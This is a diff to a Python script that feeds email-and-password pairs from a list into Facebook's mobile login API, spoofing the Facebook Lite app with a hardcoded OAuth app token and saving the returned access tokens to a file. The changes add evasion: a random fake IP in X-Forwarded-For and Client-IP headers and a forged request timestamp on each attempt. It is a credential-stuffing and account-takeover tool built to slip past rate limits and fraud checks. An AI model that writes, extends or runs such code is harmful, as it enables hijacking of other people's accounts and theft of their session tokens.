@@ -8,11 +8,20 @@ import requests
 # Generate a fake UNIX timestamp (e.g., last few days)
 def generate_fake_timestamp():
     now = int(time.time())
-    random_offset = random.randint(-86400 * 5, 0)  # Up to 5 days ago
+    random_offset = random.randint(-86400 * 1, 0)  # Up to 1 day ago
     return str(now + random_offset)
 
-# Facebook Graph API headers
-headers = {
+# Generate a random fake IPv4 address
+def generate_fake_ip():
+    return "{}.{}.{}.{}".format(
+        random.randint(1, 254),
+        random.randint(0, 255),
+        random.randint(0, 255),
+        random.randint(1, 254)
+    )
+
+# Base headers (without IP and timestamp)
+base_headers = {
     'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
     'User-Agent': '[FBAN/FB4A;FBAV/388.0.0.21.107;FBBV/469533592;FBDM/{density=2.0,width=720,height=1520};FBLC/en_US;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.lite;FBDV/SM-A107F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi]',
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -25,14 +34,10 @@ headers = {
     'accept-encoding': 'gzip, deflate',
     'content-type': 'application/x-www-form-urlencoded',
     'x-fb-http-engine': 'Liger',
-    'x-fb-request-time': generate_fake_timestamp(),  # <-- Fake timestamp added
-
 }
-
 
 # Parse line into email and password
 def parse_line(line):
-    # Handle Facebook profile ID link
     fb_prefix = "https://www.facebook.com/profile.php?id="
     if line.startswith(fb_prefix):
         line = line[len(fb_prefix):]
@@ -44,7 +49,6 @@ def parse_line(line):
         return email_or_link, password
     return None, None
 
-# Main logic
 def main():
     with open("tokens.txt", "w", encoding="utf-8") as token_file:
         while True:
@@ -73,6 +77,15 @@ def main():
                 'generate_machine_id': '0',
                 'fb_api_req_friendly_name': 'authenticate',
             }
+
+            # Generate new fake IP and timestamp for each request
+            fake_ip = generate_fake_ip()
+
+            # Copy base headers so you don't modify the original dict
+            headers = base_headers.copy()
+            headers['X-Forwarded-For'] = fake_ip
+            headers['Client-IP'] = fake_ip
+            headers['x-fb-request-time'] = generate_fake_timestamp()
 
             try:
                 response = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data)
